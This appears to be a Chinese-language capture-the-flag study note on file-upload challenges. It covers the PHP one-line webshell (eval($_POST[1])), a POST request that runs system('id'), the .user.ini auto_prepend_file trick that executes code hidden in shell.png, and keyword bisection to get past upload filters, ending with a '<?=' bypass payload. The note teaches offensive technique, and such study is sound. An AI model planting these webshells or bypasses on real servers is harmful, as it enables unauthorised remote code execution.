文件上传题 · 最初思路

1.不管什么网站，只要有上传文件的地方，就要想到：我能不能传一个”不是它想要的东西”上去？

网站本来想让你传：

  • 头像 → 图片
  • 附件 → 文档

但攻击者要想：

  • 传一个能被服务器执行的恶意文件上去

所以第一反应不是”试试传图片”，而是问自己三个问题：

  1. 服务器是什么语言？（决定传什么类型的文件）

  2. 它怎么验证我传的文件？（决定要不要绕过）

  3. 传上去之后怎么访问它？（决定木马怎么用）

2.判断服务器语言 —— 决定传什么

看响应头：

这是 PHP 网站

服务器语言 可执行的恶意文件
PHP .php
Java .jsp
ASP.NET .aspx
Python 一般不能直接传文件执行
Node.js .js（看环境）

所以这题思路定了：传一个 .php 文件上去。

3.传什么 PHP 文件？—— 一句话木马的由来

传普通 PHP 文件没意义，我们要的是”能执行任意命令”的文件，而且要越短越好（短 = 容易绕过过滤）。

于是诞生了最经典的一句话木马：

代码 作用
<?php ... ?> PHP 代码的固定包裹格式
eval() PHP 函数：把字符串当代码执行（木马的核心）
$_POST['1'] 接收我们 POST 过去的参数 1 的值

它的意思是：把 POST 请求里名叫 1 的参数，当成 PHP 代码来执行。

所以我们要发一个 POST 请求，带一个参数叫 1，里面装 PHP 代码。逐行解释：

  • POST：方法（要提交数据）
  • /upload/shell.php：访问哪个文件 → 你的木马
  • HTTP/1.1：协议版本，固定写法
  • 告诉服务器：我要访问这个域名
  • 告诉服务器：我下面发的数据是”普通表单格式”

（这里有个空行，必须有！它把”头部”和”数据”隔开）

  • 这就是数据部分。

  • 1 = 参数名，对应木马里的 $_POST[1]

  • system('id'); = 一段 PHP 代码，意思是”执行系统命令 id“

  • 木马收到后就会 eval("system('id');") → 执行 id 命令 → 把结果返回给你

绕过思路：既然只拦 .php 后缀

那就传一个 “不叫 .php，但照样能执行 PHP” 的东西 —— .user.ini。

.user.ini文件

通俗解释 .user.ini：

它是 PHP 的”目录配置文件”，放在某个文件夹里，能给这个文件夹装一个”自动加载器”。

auto_prepend_file=shell.png 的意思是：这个目录下，任何 PHP 文件被执行前，都先自动执行一遍 shell.png。

所以我们传两个东西：

  1. .user.ini → 配置文件（后缀是 ini，不叫 php，能过 WAF）
  2. shell.png → 藏着 PHP 代码的”图片”（和之前一样的 webshell）

然后访问这个目录里任意一个 .php 文件，它就会”顺手”把 shell.png 里的代码执行了。

如何寻找过滤点

  1. 原 payload 打不通 → 有新过滤

  2. 只改内容/只改文件名 → 定位过滤作用在哪个字段

  3. 拆出最小单元逐个试 → 定位具体关键词

    二分法测，传这些看哪个被拒：

    1. <?php → 拒了说明查 <?
    2. 换成 <?= → 拒了说明查 <? 变体
    3. <?= 123;?> → 拒了说明查 <? 本身
    4. 纯文本 eval → 拒了说明查函数名
    5. $_POST / $_GET → 拒了说明查超全局变量

    每拒一个，就记下”敏感词”，然后想办法换写法

    这道题<?php eval($_POST[1]); ?>换成<?= eval($_POST[1]); ?> 即可
